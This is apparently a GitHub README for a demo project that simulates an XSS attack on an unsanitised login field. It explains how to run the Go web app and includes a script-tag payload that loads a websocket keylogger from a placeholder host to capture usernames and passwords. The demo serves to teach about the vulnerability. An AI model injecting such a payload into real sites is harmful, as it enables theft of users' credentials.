# Xss-Keylogger-with-demo
A websocket keylogger that listens to user input

What is it?:

This is a simulation of a how vulnerable inputs can lead to Xss attacks. The payload is a websocket keyloagger that logs user input (username and password in this case)

Usage:
Step 1
run the webapp and navigate to the login page
```go run main.go -listen-addr=<ip>:<port> -ws-addr=<ip>:<port>```
![running the web app and navigating to the login page](https://github.com/SchrodingersNeko749/Xss-Keylogger-with-demo/blob/main/wsklogger1.png)

Step 2
Experiment with the username input. it will print everything that you write without sanitization.

https://github.com/SchrodingersNeko749/Xss-Keylogger-with-demo/blob/main/wsklogger2.png 

![experimenting with user input](https://github.com/SchrodingersNeko749/Xss-Keylogger-with-demo/blob/main/wsklogger2.png)

Step 3 
Run this javascript to make a websocket connection. it uses the same ip and port of the webapp in this case.
 ```<script src='http://<wskeylogger_ip>:<port>/k.js'></script>```
![running malicious script](https://github.com/SchrodingersNeko749/Xss-Keylogger-with-demo/blob/main/wsklogger3.png)

Step 4
See how every input is now being logged
![running malicious script](https://github.com/SchrodingersNeko749/Xss-Keylogger-with-demo/blob/main/wsklogger4.png)
